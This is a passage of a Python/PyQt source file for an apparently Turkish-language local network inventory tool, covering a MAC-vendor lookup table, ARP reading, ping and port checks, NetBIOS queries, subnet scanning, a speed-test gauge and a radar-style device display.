    "00:0A:41":("Cisco","router"),"00:09:7C":("Cisco","router"),"00:E0:1E":("Cisco","router"),
    "00:23:04":("Cisco","switch"),"00:1E:79":("Cisco","switch"),"58:BC:27":("Cisco","switch"),
    "4C:4E:35":("MikroTik","router"),"6C:3B:6B":("MikroTik","router"),"D4:CA:6D":("MikroTik","router"),
    "E4:8D:8C":("MikroTik","router"),"CC:2D:E0":("MikroTik","router"),"48:8F:5A":("MikroTik","router"),
    "00:0C:42":("MikroTik","router"),"64:D1:54":("MikroTik","router"),"2C:C8:1B":("MikroTik","router"),
    "00:27:22":("Ubiquiti","router"),"44:D9:E7":("Ubiquiti","router"),"80:2A:A8":("Ubiquiti","router"),
    "04:18:D6":("Ubiquiti","router"),"F0:9F:C2":("Ubiquiti","router"),"68:72:51":("Ubiquiti","router"),
    "24:5A:4C":("Ubiquiti","router"),"FC:EC:DA":("Ubiquiti","router"),"78:8A:20":("Ubiquiti","router"),
    "00:15:6D":("Ubiquiti","router"),"DC:9F:DB":("Ubiquiti","router"),"E0:63:DA":("Ubiquiti","router"),
    "18:E8:29":("Ubiquiti","router"),"B4:FB:E4":("Ubiquiti","router"),
    "00:1F:33":("Netgear","router"),"00:14:6C":("Netgear","router"),"C0:3F:0E":("Netgear","router"),
    "20:4E:7F":("Netgear","router"),"A0:21:B7":("Netgear","router"),"9C:3D:CF":("Netgear","router"),
    "00:1E:58":("D-Link","router"),"00:19:5B":("D-Link","router"),"00:26:5A":("D-Link","router"),
    "14:D6:4D":("D-Link","router"),"1C:7E:E5":("D-Link","router"),"78:54:2E":("D-Link","router"),
    "00:1D:0F":("TP-Link","router"),"50:C7:BF":("TP-Link","router"),"B0:BE:76":("TP-Link","router"),
    "F8:1A:67":("TP-Link","router"),"60:E3:27":("TP-Link","router"),"30:B5:C2":("TP-Link","router"),
    "00:0E:2E":("Edimax","router"),"00:1F:1F":("Edimax","router"),"74:DA:38":("Edimax","router"),
    "00:19:CB":("ZyXEL","router"),"00:A0:C5":("ZyXEL","router"),"00:13:49":("ZyXEL","router"),
    "00:23:F8":("ZyXEL","router"),"6C:62:6D":("ZyXEL","router"),"D8:FE:E3":("D-Link","switch"),
    "00:22:2D":("SMC Networks","switch"),"00:12:CF":("SMC Networks","switch"),
    "00:1E:58":("D-Link","switch"),"1C:87:2C":("Aruba","switch"),"00:0B:86":("Aruba","switch"),
    "24:DE:C6":("Aruba","switch"),"94:B4:0F":("Aruba","switch"),"9C:1C:12":("Aruba","switch"),
    "00:24:6C":("Aruba","switch"),"D8:C7:C8":("Aruba","switch"),"70:3A:0E":("Aruba","switch"),
    "6C:F3:7F":("Aruba","switch"),"00:1A:1E":("Aruba","switch"),"F0:5C:19":("Aruba","switch"),
    "20:A6:CD":("Aruba","switch"),"AC:A3:1E":("Aruba","switch"),"B4:5D:50":("Aruba","switch"),
    "B0:5A:DA":("Hewlett Packard Enterprise","switch"),"3C:4A:92":("Hewlett Packard","switch"),
    "00:11:0A":("Hewlett Packard","switch"),"00:18:71":("Hewlett Packard","switch"),
    "00:1C:2E":("Hewlett Packard","switch"),"00:21:F7":("Hewlett Packard","switch"),
    "00:25:61":("Hewlett Packard","switch"),"2C:27:D7":("Hewlett Packard","switch"),
    "34:FC:B9":("Hewlett Packard","switch"),"78:AC:C0":("Hewlett Packard","switch"),
    "B4:99:BA":("Hewlett Packard","switch"),"E8:39:35":("Hewlett Packard","switch"),
    "00:08:02":("Hewlett Packard","switch"),"00:0D:9D":("Hewlett Packard","switch"),
    "00:0E:7F":("Hewlett Packard","switch"),"00:0F:20":("Hewlett Packard","switch"),
    # NAS
    "00:11:32":("Synology","nas"),"00:11:5B":("Elitegroup","computer"),
    "00:50:43":("Marvell","nas"),"00:90:A9":("Western Digital","nas"),
    "28:C6:8E":("NETGEAR","nas"),"00:08:9B":("QNAP","nas"),
    # Bilgisayarlar
    "00:1A:A0":("Dell","computer"),"00:14:22":("Dell","computer"),"00:21:9B":("Dell","computer"),
    "18:03:73":("Dell","computer"),"44:A8:42":("Dell","computer"),"B8:AC:6F":("Dell","computer"),
    "00:0D:60":("IBM","computer"),"00:09:6B":("IBM","computer"),"00:1A:64":("IBM","computer"),
    "00:1C:25":("Asustek","computer"),"00:1E:8C":("Asustek","computer"),"00:26:18":("Asustek","computer"),
    "14:DA:E9":("Asustek","computer"),"2C:56:DC":("Asustek","computer"),"74:D0:2B":("Asustek","computer"),
    "00:16:3E":("Xensource","computer"),"00:1F:C6":("ASRock","computer"),
    "60:45:CB":("Asustek","computer"),"04:92:26":("Asustek","computer"),"E0:3F:49":("Asustek","computer"),
    "00:1F:D0":("Gigabyte Technology","computer"),"1C:1B:0D":("Gigabyte Technology","computer"),
    "00:21:97":("Intel Corporate","computer"),"00:1E:67":("Intel Corporate","computer"),
    "18:DB:F2":("Intel Corporate","computer"),"48:51:B7":("Intel Corporate","computer"),
    "A4:4C:C8":("Intel Corporate","computer"),"8C:EC:4B":("Intel Corporate","computer"),
    # Apple
    "00:03:93":("Apple","computer"),"00:0A:27":("Apple","computer"),"00:0D:93":("Apple","computer"),
    "00:11:24":("Apple","computer"),"00:14:51":("Apple","computer"),"00:17:F2":("Apple","computer"),
    "00:1E:C2":("Apple","computer"),"00:23:12":("Apple","computer"),"00:25:BC":("Apple","computer"),
    "28:CF:E9":("Apple","computer"),"3C:15:C2":("Apple","computer"),"40:6C:8F":("Apple","computer"),
    "60:03:08":("Apple","computer"),"70:DE:E2":("Apple","computer"),"78:31:C1":("Apple","computer"),
    "A8:86:DD":("Apple","computer"),"B8:17:C2":("Apple","computer"),"D4:9A:20":("Apple","computer"),
    # Huawei
    "00:18:82":("Huawei","router"),"00:1E:10":("Huawei","router"),"00:25:9E":("Huawei","router"),
    "04:BD:70":("Huawei","router"),"10:47:80":("Huawei","router"),"28:6E:D4":("Huawei","router"),
    "34:CD:BE":("Huawei","router"),"48:46:FB":("Huawei","router"),"58:2A:F7":("Huawei","router"),
    "5C:7D:5E":("Huawei","router"),"60:DE:44":("Huawei","router"),"70:72:3C":("Huawei","router"),
    "88:53:D4":("Huawei","router"),"94:04:9C":("Huawei","router"),"AC:E8:7B":("Huawei","router"),
    # Fortinet
    "00:09:0F":("Fortinet","firewall"),"08:5B:0E":("Fortinet","firewall"),"70:4C:A5":("Fortinet","firewall"),
    "90:6C:AC":("Fortinet","firewall"),"E8:1C:BA":("Fortinet","firewall"),
    # Juniper
    "00:05:85":("Juniper","router"),"00:10:DB":("Juniper","router"),"00:12:1E":("Juniper","router"),
    "00:14:F6":("Juniper","router"),"00:17:CB":("Juniper","router"),"00:19:E2":("Juniper","router"),
    "00:1D:B5":("Juniper","router"),"00:21:59":("Juniper","router"),"00:22:83":("Juniper","router"),
    "00:24:DC":("Juniper","router"),"00:26:88":("Juniper","router"),"2C:21:31":("Juniper","router"),
    "2C:6B:F5":("Juniper","router"),"3C:61:04":("Juniper","router"),"3C:8A:B0":("Juniper","router"),
    "40:A6:77":("Juniper","router"),"44:F4:77":("Juniper","router"),"4C:96:14":("Juniper","router"),
    "54:1E:56":("Juniper","router"),"5C:45:27":("Juniper","router"),"64:64:9B":("Juniper","router"),
    "64:87:88":("Juniper","router"),"78:19:F7":("Juniper","router"),"78:FE:3D":("Juniper","router"),
    "80:71:1F":("Juniper","router"),"84:18:88":("Juniper","router"),"84:B5:9C":("Juniper","router"),
    "88:E0:F3":("Juniper","router"),"9C:CC:83":("Juniper","router"),"A8:D0:E5":("Juniper","router"),
    "AC:4B:C8":("Juniper","router"),"B0:A8:6E":("Juniper","router"),"B0:C6:9A":("Juniper","router"),
    "CC:E1:7F":("Juniper","router"),"D4:04:FF":("Juniper","router"),"EC:3E:F7":("Juniper","router"),
    "F0:1C:2D":("Juniper","router"),"F4:A7:39":("Juniper","router"),"F4:CC:55":("Juniper","router"),
}
COMMON_PORTS={22:"SSH",80:"HTTP",135:"MSRPC",139:"NetBIOS",443:"HTTPS",445:"SMB",554:"RTSP",3389:"RDP",5900:"VNC",8080:"HTTP-Alt"}

def get_local_ip():
    try:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
    except:return "192.168.1.1"
def get_subnet():return ".".join(get_local_ip().split('.')[:3])

def get_mac_vendor(mac):
    """MAC adresinden üretici bilgisi al - önce local DB, sonra online API"""
    if not mac:
        return "", "unknown"
    prefix = mac.upper().replace("-", ":").replace(".", ":")[:8]
    
    # Önce local veritabanına bak
    if prefix in MAC_VENDORS:
        return MAC_VENDORS[prefix]
    
    # Online API lookup (macvendors.com)
    try:
        import urllib.request
        url = f"https://api.macvendors.com/{mac}"
        req = urllib.request.Request(url, headers={'User-Agent': 'MotunNet/10.2'})
        with urllib.request.urlopen(req, timeout=3) as response:
            vendor = response.read().decode('utf-8').strip()
            if vendor and 'error' not in vendor.lower():
                # Cihaz türü tahmin et
                v_lower = vendor.lower()
                if any(x in v_lower for x in ['cisco', 'juniper', 'huawei', 'arista', 'brocade']):
                    return vendor, "router"
                elif any(x in v_lower for x in ['switch', 'netgear', 'tp-link', 'd-link']):
                    return vendor, "switch"
                elif any(x in v_lower for x in ['camera', 'hikvision', 'dahua', 'axis']):
                    return vendor, "camera"
                elif any(x in v_lower for x in ['printer', 'hp', 'canon', 'epson', 'brother']):
                    return vendor, "printer"
                elif any(x in v_lower for x in ['apple', 'dell', 'lenovo', 'asus', 'acer']):
                    return vendor, "computer"
                elif any(x in v_lower for x in ['synology', 'qnap', 'nas']):
                    return vendor, "nas"
                elif any(x in v_lower for x in ['fortinet', 'palo alto', 'checkpoint']):
                    return vendor, "firewall"
                elif any(x in v_lower for x in ['ubiquiti', 'mikrotik', 'cambium']):
                    return vendor, "router"
                return vendor, "unknown"
    except:
        pass
    
    return "", "unknown"
def get_arp_table():
    arp={}
    try:
        r=run_command(["arp","-a"],10)
        if r.returncode==0:
            for line in r.stdout.split('\n'):
                if platform.system()=="Windows":
                    m=re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([\da-fA-F-]{17})',line)
                    if m and m.group(2).upper()!="FF-FF-FF-FF-FF-FF":arp[m.group(1)]=m.group(2).upper().replace("-",":")
                else:
                    m=re.search(r'\((\d+\.\d+\.\d+\.\d+)\)\s+at\s+([\da-fA-F:]{17})',line)
                    if m:arp[m.group(1)]=m.group(2).upper()
    except:pass
    return arp
def get_hostname(ip):
    try:return socket.gethostbyaddr(ip)[0]
    except:return ""
def ping_host(ip):
    try:
        cmd=["ping","-n" if platform.system()=="Windows" else "-c","1","-w" if platform.system()=="Windows" else "-W","1000" if platform.system()=="Windows" else "1",ip]
        start=time.time();r=run_command(cmd,3);elapsed=(time.time()-start)*1000
        if r.returncode==0:
            m=re.search(r'time[=<]?([\d.]+)',r.stdout)
            return True,float(m.group(1)) if m else elapsed
    except:pass
    return False,0
def tcp_test(ip,ports=[80,443,445,139,3389,22,554]):
    for p in ports:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(0.3)
            if s.connect_ex((ip,p))==0:s.close();return True,p
            s.close()
        except:pass
    return False,0
def scan_port(ip,port,timeout=0.3):
    try:s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(timeout);r=s.connect_ex((ip,port))==0;s.close();return r
    except:return False
def get_netbios(ip):
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(1.5)
        s.sendto(b'\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01',(ip,137))
        data,_=s.recvfrom(1024);s.close()
        if len(data)>57:
            offset=57
            for _ in range(min(data[56],10)):
                if offset+18<=len(data):
                    name=data[offset:offset+15].decode('ascii',errors='ignore').strip()
                    if data[offset+15]==0x00 and not (struct.unpack('>H',data[offset+16:offset+18])[0]&0x8000):return name
                    offset+=18
    except:pass
    return ""
def scan_device(ip,arp_table,org):
    now=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    mac_from_arp=arp_table.get(ip,"")
    online,ping_time=ping_host(ip);method="ping" if online else ""
    if not online:online,port=tcp_test(ip);method=f"tcp:{port}" if online else ""
    if not online and mac_from_arp:online=True;method="arp"
    d=NetworkDevice(ip=ip,status="online" if online else "offline",response_time=ping_time,last_seen=now if online else "",detection_method=method)
    if online:
        d.mac=mac_from_arp or ""
        vendor,dtype=get_mac_vendor(d.mac);d.vendor,d.device_type=vendor,dtype
        d.hostname=get_hostname(ip);d.netbios_name=get_netbios(ip)
        if not d.hostname and d.netbios_name:d.hostname=d.netbios_name
        for p in [5900,5901]:
            if scan_port(ip,p):d.vnc_available,d.vnc_port=True,p;d.open_ports.append(p);break
        for port in COMMON_PORTS:
            if port not in d.open_ports and scan_port(ip,port):d.open_ports.append(port)
        if org:
            asset,dept=org.match_device(d)
            if asset:
                d.asset_id,d.asset_name,d.asset_type=asset.id,asset.name,asset.asset_type
                d.department_id=asset.department_id
                d.department_name=dept.name if dept else ""
                d.location,d.is_critical=asset.location,asset.is_critical
    return d

class ScannerThread(QThread):
    progress=pyqtSignal(int,int);device_found=pyqtSignal(NetworkDevice);scan_complete=pyqtSignal(list);status_update=pyqtSignal(str)
    def __init__(self,subnet,start_ip,end_ip,workers=50,show_offline=True,org=None):
        super().__init__()
        self.subnet,self.start_ip,self.end_ip,self.workers,self.show_offline,self.org=subnet,start_ip,end_ip,workers,show_offline,org
        self.running,self.devices=True,[]
    def stop(self):self.running=False
    def run(self):
        total=self.end_ip-self.start_ip+1;completed=0
        self.status_update.emit("ARP tablosu okunuyor...")
        arp=get_arp_table()
        self.status_update.emit(f"Tarama başlıyor... (ARP: {len(arp)})")
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futures={ex.submit(scan_device,f"{self.subnet}.{i}",arp,self.org):i for i in range(self.start_ip,self.end_ip+1) if self.running}
            for f in as_completed(futures):
                if not self.running:break
                try:
                    d=f.result()
                    if self.show_offline or d.status=="online":
                        self.devices.append(d)
                        self.device_found.emit(d)
                except:pass
                completed+=1;self.progress.emit(completed,total)
        online=sum(1 for d in self.devices if d.status=="online")
        matched=sum(1 for d in self.devices if d.asset_name)
        self.status_update.emit(f"Tamamlandı: {online} çevrimiçi, {matched} eşleşen")
        self.scan_complete.emit(self.devices)

# ============= UI WIDGETS =============
class SpeedGaugeWidget(QWidget):
    def __init__(self,title,unit,max_val,color="#00ff88",parent=None):
        super().__init__(parent)
        self.title,self.unit,self.max_val,self.color=title,unit,max_val,QColor(color)
        self.value,self.target=0,0
        self.timer=QTimer(self);self.timer.timeout.connect(self.animate)
        self.setMinimumSize(100,100);self.setSizePolicy(QSizePolicy.Policy.Expanding,QSizePolicy.Policy.Expanding)
    def setValue(self,v):self.target=min(v,self.max_val);self.timer.start(16)
    def reset(self):self.value=self.target=0;self.update()
    def animate(self):
        diff=self.target-self.value
        if abs(diff)<0.1:self.value=self.target;self.timer.stop()
        else:self.value+=diff*0.15
        self.update()
    def paintEvent(self,e):
        p=QPainter(self);p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w,h=self.width(),self.height();sz=min(w,h);cx,cy=w//2,h//2;r=sz//2-12
        bg=QRadialGradient(cx,cy,r+8);bg.setColorAt(0,QColor(30,35,50));bg.setColorAt(1,QColor(20,25,35))
        p.setBrush(QBrush(bg));p.setPen(Qt.PenStyle.NoPen);p.drawEllipse(cx-r-8,cy-r-8,(r+8)*2,(r+8)*2)
        arc=QRectF(cx-r+8,cy-r+8,(r-8)*2,(r-8)*2)
        p.setPen(QPen(QColor(50,55,70),8,Qt.PenStyle.SolidLine,Qt.PenCapStyle.RoundCap));p.drawArc(arc,225*16,-270*16)
        if self.value>0:
            ratio=min(self.value/self.max_val,1.0)
            col=QColor(231,76,60) if ratio<0.3 else QColor(241,196,15) if ratio<0.6 else self.color
            p.setPen(QPen(col,8,Qt.PenStyle.SolidLine,Qt.PenCapStyle.RoundCap));p.drawArc(arc,225*16,int(-270*ratio)*16)
        p.setPen(QColor(120,130,150));p.setFont(QFont("Segoe UI",8));p.drawText(QRectF(0,cy-r+20,w,16),Qt.AlignmentFlag.AlignCenter,self.title)
        p.setPen(QColor(255,255,255));p.setFont(QFont("Segoe UI",18,QFont.Weight.Bold));p.drawText(QRectF(0,cy-8,w,26),Qt.AlignmentFlag.AlignCenter,f"{self.value:.1f}")
        p.setPen(QColor(100,110,130));p.setFont(QFont("Segoe UI",9));p.drawText(QRectF(0,cy+18,w,16),Qt.AlignmentFlag.AlignCenter,self.unit)

class SpeedTestWidget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent);self.thread=None;self.history=[]
        layout=QVBoxLayout(self);layout.setSpacing(8);layout.setContentsMargins(10,10,10,10)
        title=QLabel("🚀 İnternet Hız Testi");title.setStyleSheet("font-size:16px;font-weight:bold;color:#00ff88;");title.setAlignment(Qt.AlignmentFlag.AlignCenter);layout.addWidget(title)
        gl=QHBoxLayout();gl.setSpacing(10)
        self.dl_gauge=SpeedGaugeWidget("DOWNLOAD","Mbps",200,"#00d4ff");self.ul_gauge=SpeedGaugeWidget("UPLOAD","Mbps",100,"#00ff88");self.ping_gauge=SpeedGaugeWidget("PING","ms",100,"#f39c12")
        for g in [self.dl_gauge,self.ul_gauge,self.ping_gauge]:g.setMinimumSize(110,110);g.setMaximumSize(160,160)
        gl.addStretch();gl.addWidget(self.dl_gauge);gl.addWidget(self.ul_gauge);gl.addWidget(self.ping_gauge);gl.addStretch();layout.addLayout(gl)
        self.progress=QProgressBar();self.progress.setStyleSheet("QProgressBar{border:1px solid #0f3460;border-radius:6px;background:#16213e;color:#00ff88;font-weight:bold;text-align:center;font-size:10px;}QProgressBar::chunk{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00ff88,stop:1 #00d4ff);border-radius:5px;}");self.progress.setMaximumHeight(20);layout.addWidget(self.progress)
        self.status=QLabel("Hazır");self.status.setAlignment(Qt.AlignmentFlag.AlignCenter);self.status.setStyleSheet("color:#888;font-size:11px;");layout.addWidget(self.status)
        bl=QHBoxLayout();bl.setSpacing(6)
        self.start_btn=QPushButton("🚀 Hız Testi Başlat");self.start_btn.setMinimumHeight(40);self.start_btn.setStyleSheet("QPushButton{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00d4ff,stop:1 #00ff88);color:#1a1a2e;border:none;border-radius:8px;font-weight:bold;font-size:12px;}QPushButton:hover{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 #00ff88,stop:1 #00d4ff);}QPushButton:disabled{background:#333;color:#666;}");self.start_btn.clicked.connect(self.start_test);bl.addWidget(self.start_btn)
        self.stop_btn=QPushButton("⏹");self.stop_btn.setMinimumHeight(40);self.stop_btn.setFixedWidth(45);self.stop_btn.setEnabled(False);self.stop_btn.setStyleSheet("QPushButton{background:#e74c3c;color:white;border:none;border-radius:8px;font-weight:bold;}QPushButton:hover{background:#c0392b;}QPushButton:disabled{background:#333;color:#666;}");self.stop_btn.clicked.connect(self.stop_test);bl.addWidget(self.stop_btn);layout.addLayout(bl)
        layout.addWidget(QLabel("📊 Geçmiş"))
        self.hist_list=QListWidget();self.hist_list.setMaximumHeight(100);self.hist_list.setStyleSheet("QListWidget{background:#16213e;border:1px solid #0f3460;border-radius:6px;color:white;font-size:10px;}QListWidget::item{padding:4px;border-bottom:1px solid #0f3460;}");layout.addWidget(self.hist_list)
        layout.addStretch()
    def start_test(self):
        self.start_btn.setEnabled(False);self.stop_btn.setEnabled(True);self.dl_gauge.reset();self.ul_gauge.reset();self.ping_gauge.reset();self.progress.setValue(0)
        self.thread=SpeedTestThread();self.thread.progress.connect(lambda s,p:(self.status.setText(s),self.progress.setValue(p)));self.thread.result.connect(self.on_result);self.thread.start()
    def stop_test(self):
        if self.thread:self.thread.stop()
        self.start_btn.setEnabled(True);self.stop_btn.setEnabled(False);self.status.setText("Durduruldu")
    def on_result(self,r):
        self.start_btn.setEnabled(True);self.stop_btn.setEnabled(False)
        self.dl_gauge.setValue(r.download_speed);self.ul_gauge.setValue(r.upload_speed);self.ping_gauge.setValue(r.ping)
        self.history.append(r);self.hist_list.insertItem(0,f"📅 {r.timestamp} | ⬇️ {r.download_speed:.1f} Mbps | ⬆️ {r.upload_speed:.1f} Mbps | 🏓 {r.ping:.0f} ms")
        while self.hist_list.count()>10:self.hist_list.takeItem(self.hist_list.count()-1)
        self.status.setText(f"✅ Tamamlandı - Jitter: {r.jitter:.1f} ms")
    def get_last(self):return self.history[-1] if self.history else None

class Particle:
    def __init__(self,x,y,color):
        self.x,self.y,self.color=x,y,color;a=random.uniform(0,2*math.pi)
        self.vx,self.vy=math.cos(a)*random.uniform(0.5,2),math.sin(a)*random.uniform(0.5,2)
        self.life,self.decay,self.size=1.0,random.uniform(0.01,0.03),random.uniform(2,5)
    def update(self):self.x+=self.vx;self.y+=self.vy;self.life-=self.decay;return self.life>0

class CyberpunkRadarWidget(QWidget):
    device_clicked=pyqtSignal(NetworkDevice);assign_asset=pyqtSignal(NetworkDevice,str);edit_asset=pyqtSignal(NetworkDevice);vnc_requested=pyqtSignal(NetworkDevice)
    def __init__(self,parent=None):
        super().__init__(parent);self.angle,self.devices,self.positions,self.scanning,self.hovered=0,[],{},False,None;self.particles,self.glow_phase=[],0
        self.setMinimumSize(250,250);self.setSizePolicy(QSizePolicy.Policy.Expanding,QSizePolicy.Policy.Expanding);self.setMouseTracking(True);self.timer=QTimer(self);self.timer.timeout.connect(self.animate);self.timer.start(25)
        self.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu);self.customContextMenuRequested.connect(self.show_context_menu)
    def start_scanning(self):self.scanning=True;self.particles=[]
    def stop_scanning(self):self.scanning=False
    def add_device(self,d):
        if d.ip not in self.positions:
            a,dist=random.uniform(0,2*math.pi),random.uniform(0.2,0.85);self.positions[d.ip]={'angle':a,'distance':dist,'device':d,'pulse':random.uniform(0,6.28)}
            if d.status=="online":
                r=min(self.width(),self.height())//2-30;x,y=dist*r*math.cos(a),dist*r*math.sin(a)
                for _ in range(10):self.particles.append(Particle(x,y,QColor(0,255,136)))
        else:self.positions[d.ip]['device']=d
        if d not in self.devices:self.devices.append(d)
    def clear_devices(self):self.devices,self.positions,self.particles=[],{},[]
    def animate(self):
        if self.scanning:self.angle=(self.angle+3)%360
        self.glow_phase=(self.glow_phase+0.05)%6.28;self.particles=[p for p in self.particles if p.update()]
        for data in self.positions.values():data['pulse']=(data['pulse']+0.08)%6.28
        self.update()
    def get_device_at(self,pos):
        cx,cy=self.width()//2,self.height()//2;r=min(self.width(),self.height())//2-30
        for ip,data in self.positions.items():
            x,y=cx+int(data['distance']*r*math.cos(data['angle'])),cy+int(data['distance']*r*math.sin(data['angle']))
            if (pos.x()-x)**2+(pos.y()-y)**2<=400:return data['device']
        return None
    def mouseMoveEvent(self,e):self.hovered=self.get_device_at(e.pos());self.setCursor(Qt.CursorShape.PointingHandCursor if self.hovered else Qt.CursorShape.ArrowCursor)
    def mousePressEvent(self,e):
        if e.button()==Qt.MouseButton.LeftButton:
            d=self.get_device_at(e.pos())
            if d:self.device_clicked.emit(d)
    def show_context_menu(self,pos):
        d=self.get_device_at(pos)
        if not d or d.status!="online":return
        menu=QMenu(self)
        menu.setStyleSheet("QMenu{background:#1a1a2e;color:white;border:1px solid #0f3460;border-radius:8px;padding:5px;}QMenu::item{padding:8px 20px;border-radius:4px;}QMenu::item:selected{background:#0f3460;}QMenu::separator{height:1px;background:#0f3460;margin:5px 10px;}")
        title=menu.addAction(f"📍 {d.ip}" + (f" - {d.asset_name}" if d.asset_name else ""));title.setEnabled(False)
        menu.addSeparator()
        if d.asset_id:
            edit_act=menu.addAction("✏️ Varlığı Düzenle");edit_act.triggered.connect(lambda:self.edit_asset.emit(d))
        else:
            assign_menu=menu.addMenu("📋 Hızlı Varlık Ata")
            for atype in AssetType:
                cfg=ASSET_CONFIG[atype];act=assign_menu.addAction(f"{cfg['icon']} {cfg['name']}");act.triggered.connect(lambda c,t=atype.value,dev=d:self.assign_asset.emit(dev,t))
        menu.addSeparator()
        if d.vnc_available:vnc_act=menu.addAction("🖥️ VNC Bağlan");vnc_act.triggered.connect(lambda:self.vnc_requested.emit(d));menu.addSeparator()
        copy_ip=menu.addAction("📋 IP Kopyala");copy_ip.triggered.connect(lambda:QApplication.clipboard().setText(d.ip))
        details_act=menu.addAction("🔍 Detayları Göster");details_act.triggered.connect(lambda:self.device_clicked.emit(d))
        menu.exec(self.mapToGlobal(pos))
    def paintEvent(self,e):
        p=QPainter(self);p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w,h=self.width(),self.height();cx,cy=w//2,h//2;r=min(w,h)//2-30
        bg=QRadialGradient(cx,cy,r*1.5);bg.setColorAt(0,QColor(15,20,35));bg.setColorAt(1,QColor(5,8,15));p.fillRect(self.rect(),QBrush(bg))
        for i in range(1,5):rr=r*i//4;p.setPen(QPen(QColor(0,150,180,60+i*15),1));p.setBrush(Qt.BrushStyle.NoBrush);p.drawEllipse(cx-rr,cy-rr,rr*2,rr*2)
        p.setPen(QPen(QColor(0,100,120,60),1));p.drawLine(cx-r,cy,cx+r,cy);p.drawLine(cx,cy-r,cx,cy+r)
        if self.scanning:
            sweep=math.radians(self.angle-90);path=QPainterPath();path.moveTo(cx,cy)
            for a in range(31):ar=math.radians(self.angle-30+a-90);path.lineTo(cx+r*math.cos(ar),cy+r*math.sin(ar))
            path.closeSubpath();sg=QRadialGradient(cx,cy,r);sg.setColorAt(0,QColor(0,255,136,0));sg.setColorAt(1,QColor(0,255,136,100));p.setBrush(QBrush(sg));p.setPen(Qt.PenStyle.NoPen);p.drawPath(path)
            sx,sy=cx+int(r*math.cos(sweep)),cy+int(r*math.sin(sweep));p.setPen(QPen(QColor(0,255,136),2));p.drawLine(cx,cy,sx,sy)
        for pt in self.particles:alpha=int(255*pt.life);p.setBrush(QBrush(QColor(0,255,136,alpha)));p.setPen(Qt.PenStyle.NoPen);sz=pt.size*pt.life;p.drawEllipse(int(cx+pt.x-sz/2),int(cy+pt.y-sz/2),int(sz),int(sz))
        for ip,data in self.positions.items():
            d,dist=data['device'],data['distance']*r;x,y=cx+int(dist*math.cos(data['angle'])),cy+int(dist*math.sin(data['angle']))
            if d.status=="online":
                if d.asset_type:
                    try:col=QColor(ASSET_CONFIG[AssetType(d.asset_type)]['color'])
                    except:col=QColor(0,212,255)
                else:col=QColor(0,212,255)
                p.setPen(QPen(QColor(0,255,136,40),1,Qt.PenStyle.DotLine));p.drawLine(cx,cy,x,y)
                if d.is_critical:p.setPen(QPen(QColor(255,0,0,150),3));p.setBrush(Qt.BrushStyle.NoBrush);cr=14+3*math.sin(data['pulse']);p.drawEllipse(int(x-cr),int(y-cr),int(cr*2),int(cr*2))
                if self.hovered and self.hovered.ip==ip:hg=QRadialGradient(x,y,25);hg.setColorAt(0,QColor(255,255,255,150));hg.setColorAt(1,QColor(255,255,255,0));p.setBrush(QBrush(hg));p.setPen(Qt.PenStyle.NoPen);p.drawEllipse(x-25,y-25,50,50)
                dg=QRadialGradient(x,y,12);dg.setColorAt(0,QColor(col.red(),col.green(),col.blue(),200));dg.setColorAt(1,QColor(col.red(),col.green(),col.blue(),0));p.setBrush(QBrush(dg));p.setPen(Qt.PenStyle.NoPen);p.drawEllipse(x-12,y-12,24,24)
                ps=5+2*math.sin(data['pulse']);p.setBrush(QBrush(col));p.setPen(QPen(QColor(255,255,255,150),1));p.drawEllipse(int(x-ps),int(y-ps),int(ps*2),int(ps*2))
                if d.asset_name:
                    font=QFont();font.setFamily("Segoe UI");font.setPixelSize(9);font.setBold(True);p.setFont(font);p.setPen(QColor(255,255,255,220));p.drawText(int(x-35),int(y+12),70,16,Qt.AlignmentFlag.AlignCenter,d.asset_name[:12])
            else:p.setBrush(QBrush(QColor(80,80,100,80)));p.setPen(Qt.PenStyle.NoPen);p.drawEllipse(x-3,y-3,6,6)
        cg=QRadialGradient(cx,cy,15);cg.setColorAt(0,QColor(0,255,136,200));cg.setColorAt(1,QColor(0,255,136,0));p.setBrush(QBrush(cg));p.setPen(Qt.PenStyle.NoPen);p.drawEllipse(cx-15,cy-15,30,30)
        p.setBrush(QBrush(QColor(0,255,136)));p.drawEllipse(cx-6,cy-6,12,12);p.setBrush(QBrush(QColor(255,255,255)));p.drawEllipse(cx-3,cy-3,6,6)
        fg=QLinearGradient(0,0,w,h);fg.setColorAt(0,QColor(0,255,136));fg.setColorAt(0.5,QColor(0,212,255));fg.setColorAt(1,QColor(0,255,136));p.setPen(QPen(QBrush(fg),2));p.setBrush(Qt.BrushStyle.NoBrush);p.drawEllipse(cx-r,cy-r,r*2,r*2)
        tfont=QFont();tfont.setFamily("Segoe UI");tfont.setPixelSize(12);tfont.setBold(True);p.setFont(tfont);p.setPen(QColor(0,255,136));title="◈ NETWORK RADAR"+f" [{self.angle}°]" if self.scanning else "◈ NETWORK RADAR";p.drawText(10,22,title)
        online=sum(1 for d in self.devices if d.status=="online");vnc=sum(1 for d in self.devices if d.vnc_available);matched=sum(1 for d in self.devices if d.asset_name);critical=sum(1 for d in self.devices if d.is_critical and d.status=="online")
        sfont=QFont();sfont.setFamily("Segoe UI");sfont.setPixelSize(10);p.setFont(sfont);p.setPen(QColor(0,255,136,180));p.drawText(10,h-10,f"Online:{online} VNC:{vnc} Eşleşen:{matched} Kritik:{critical}")

class DeviceCardWidget(QFrame):
    clicked=pyqtSignal(NetworkDevice);vnc_connect=pyqtSignal(NetworkDevice);assign_asset=pyqtSignal(NetworkDevice,str);edit_asset=pyqtSignal(NetworkDevice)
    def __init__(self,device,parent=None):
